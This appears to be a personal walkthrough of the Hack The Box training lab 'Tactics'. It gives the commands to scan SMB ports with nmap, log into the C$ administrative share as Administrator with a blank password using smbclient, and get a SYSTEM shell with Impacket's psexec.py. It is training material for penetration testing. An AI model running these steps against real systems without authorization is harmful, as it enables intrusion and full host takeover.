## Lab Title: Tactics
- Date: 2025-08-06
- Duration: ~30 minutes

### Platform: HTB – Starting Point > Tier 1

### 1. Scenario Summary
- SMB Connection >> Windows Administrative Shares >> Impacket >> `psexec.py`

### 2. Findings
- Nmap                  >> Enumeration
    - `-Pn` >> disable Host Discovery (which ICMP packets are not sent)
    - `nmap $ip -Pn --top-ports 10000 -T5`
        ```res
            135/tcp open  msrpc
            139/tcp open  netbios-ssn
            445/tcp open  microsoft-ds
        ```
    
- SMB                   >> ftp-like client to access SMB/CIFS resources 
    - `smbclient -L $ip -U Administrator` >> to list available shares
    - In Windows, `Administrator` is highest-privileged >> option to check with `blank password`
    - Available Shares: `ADMIN$, C$, IPC$`
    - `C$` >> administrative share >> system files
    - `smbclient \\\\$ip\\C$ -U Administrator` >> with blank password log in
        - Go to `dir \Users\Administrator\Desktop` & do `get flag.txt`
        - Voila, ca y est, c'est fini! 

- Impacket >> `psexec.py` >> also an option to connect to via SMB `psexec.py administrator@$ip`
    - This connection is possible since we have `ADMIN$` >> and `PsExec` is remote-control tool for Windows Admins
    - We are now on the same page with them
    - After this, we get an interactive shell with `NT Authority/System` highest-privileges

### 3. Idea
- SMB Connection >> Windows Administrative Shares >> Impacket >> `psexec.py`
